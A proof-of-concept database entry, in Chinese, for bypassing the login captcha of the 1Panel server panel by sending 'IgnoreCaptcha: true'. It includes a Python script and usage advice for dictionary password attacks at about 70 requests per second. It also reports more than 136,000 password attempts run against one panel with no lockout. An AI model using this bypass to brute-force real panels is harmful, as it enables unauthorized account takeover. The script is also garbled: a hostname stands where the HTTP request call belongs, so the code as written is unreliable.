# 1Panel 面板登录验证码绕过（ignoreCaptcha=true → ErrAuth）

- **code**: 1panel-面板登录验证码绕过-ignorecaptcha-true-errauth
- **kind**: poc
- **category**: auth-bypass
- **component**: 1Panel
- **versions**: 1Panel v1.x（v2 面板若沿用 /api/v1 登录体同样适用）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.109:9527（1Panel v1，未启用安全入口）实测：不带 ignoreCaptcha → {"code":406,"message":"ErrCaptchaCode"}；带 ignoreCaptcha:true → {"code":406,"message":"ErrAuth"}。以此为通道跑完 136,578 次有效口令校验（10,772+50,806+75,000，覆盖 15 个候选用户名），全程无账号锁定、无限速、无 IP 封禁，速率 48-72 req/s。另注意：该面板 API 前缀是 /api/v1（不是 /api/v2/core/auth/*），v2 路径会命中 SPA catch-all 返回 HTML。
- **path**: pocs/1panel-面板登录验证码绕过-ignorecaptcha-true-errauth/1panel_ignorecaptcha_bypass.py
- **tags**: 1panel,验证码绕过,登录,弱口令,明文口令
- **created_at**: 2026-09-30T01:53:20.661Z
- **found_by**: exploit

## 描述

1Panel 登录验证码绕过：请求体 ignoreCaptcha=true 时后端跳过验证码校验，登录尝试返回 ErrAuth（口令被真实校验）而非 ErrCaptchaCode。使面板在线口令审计/弱口令检测成为可能，无需 OCR 识图。注意 1Panel v1 为明文口令登录，无需 RSA 公钥。

## 用法

```
python 1panel_ignorecaptcha_bypass.py   # 修改 B 为目标面板；对照输出 ErrCaptchaCode vs ErrAuth 即证明绕过生效
# 批量跑字典时用 6-10 线程、~70 req/s 即可（实测该面板无锁定、无限速；但请遵守授权与低噪声要求）
```

## 正文

```
#!/usr/bin/env python3
# 1Panel（v1 API /api/v1，v2 面板亦沿用该前缀）登录验证码绕过 + 明文口令在线校验
# 原理：该版本登录处理器读取请求体里的 ignoreCaptcha/IgnoreCaptcha；
#       置 true 时后端跳过验证码校验，直接进入口令校验 → 返回 ErrAuth（而验证码拦截时是 ErrCaptchaCode）。
#       前端 login-form chunk 自身默认 ignoreCaptcha:!0（true），说明这是官方保留的开关。
# 另外：这台面板是**明文口令登录**（前端不做 RSA，请求体 password 就是输入框原文），
#       所以不需要 panel_public_key / 三段式密文——前序"无公钥⇒不可登录"的结论是错的。
import json, sys, requests

B = 'http://203.0.113.109:9527'
H = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36',
     'Content-Type': 'application/json', 'Accept': 'application/json',
     'Origin': B, 'Referer': B + '/#/login'}


def login(name, password, ignore_captcha=True):
    body = {'Name': name, 'Password': password, 'AuthMethod': 'session', 'Language': 'zh',
            'IgnoreCaptcha': ignore_captcha, 'Captcha': '', 'CaptchaID': ''}
    r = target9.example.com(B + '/api/v1/auth/login', headers=H, data=json.dumps(body), timeout=20)
    return r.status_code, r.json()


if __name__ == '__main__':
    # 对照组：不带 ignoreCaptcha → ErrCaptchaCode（验证码拦截）
    print('captcha ON  :', login('1panel', 'probe', ignore_captcha=False)[1])
    # 绕过：带 ignoreCaptcha → ErrAuth（口令被真实校验，可放心跑字典）
    print('captcha OFF :', login('1panel', 'probe', ignore_captcha=True)[1])

```
